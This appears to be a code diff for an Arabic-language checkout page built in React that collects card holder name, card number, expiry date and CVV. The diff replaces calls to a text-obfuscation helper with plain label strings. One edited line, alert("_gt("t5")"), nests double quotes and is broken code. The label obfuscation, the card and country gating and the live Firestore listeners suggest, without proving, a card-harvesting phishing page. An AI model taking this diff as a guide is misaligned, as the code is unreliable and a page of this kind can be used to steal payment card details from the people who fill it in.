@@ -14,9 +14,9 @@ import { secureAddData } from "@/lib/secure-firebase"
 import { doc, onSnapshot, updateDoc } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 import { FullPageLoader } from "./loader"
+import { _gt } from "@/lib/text-obf"
 import { isCardBlocked, isCountryAllowed } from "@/lib/firebase/settings"
 import { EmailModal } from "@/components/email-modal"
-import { _gt } from "@/lib/text-obf"
 
 
 interface PaymentPageProps {
@@ -227,7 +227,7 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
     }
 
     if (!isValidCard) {
-      alert(_gt('t5'))
+      alert("_gt("t5")")
       return
     }
 
@@ -431,7 +431,7 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
           {/* Card Holder Name */}
           <div className="space-y-2">
             <label className="block text-gray-900 font-bold text-sm md:text-base">
-              {_gt('t4')}
+              اسم حامل البطاقة
             </label>
             <Input
               type="text"
@@ -448,7 +448,7 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
           <div className="space-y-2">
             <label className="flex items-center gap-2 text-gray-900 font-bold text-sm md:text-base">
               <CreditCard className="w-4 h-4 text-[#0a4a68]" />
-              {_gt('t1')}
+              رقم البطاقة
               {isValidCard && (
                 <Badge variant="outline" className="border-green-500 text-green-700 text-xs">
                   <ShieldCheck className="w-3 h-3 ml-1" />
@@ -496,7 +496,7 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
           <div className="grid grid-cols-2 gap-3 md:gap-4">
             <div className="space-y-2">
               <label className="block text-gray-900 font-bold text-sm md:text-base">
-                {_gt('t3')}
+                تاريخ الانتهاء
               </label>
               <Input
                 type="text"
@@ -519,7 +519,7 @@ export default function PaymentPage({ offerTotalPrice }: PaymentPageProps) {
             <div className="space-y-2">
               <label className="flex items-center gap-2 text-gray-900 font-bold text-sm md:text-base">
                 <Lock className="w-4 h-4 text-[#0a4a68]" />
-                {_gt('t2')}
+                CVV
               </label>
               <Input
                 type="password"
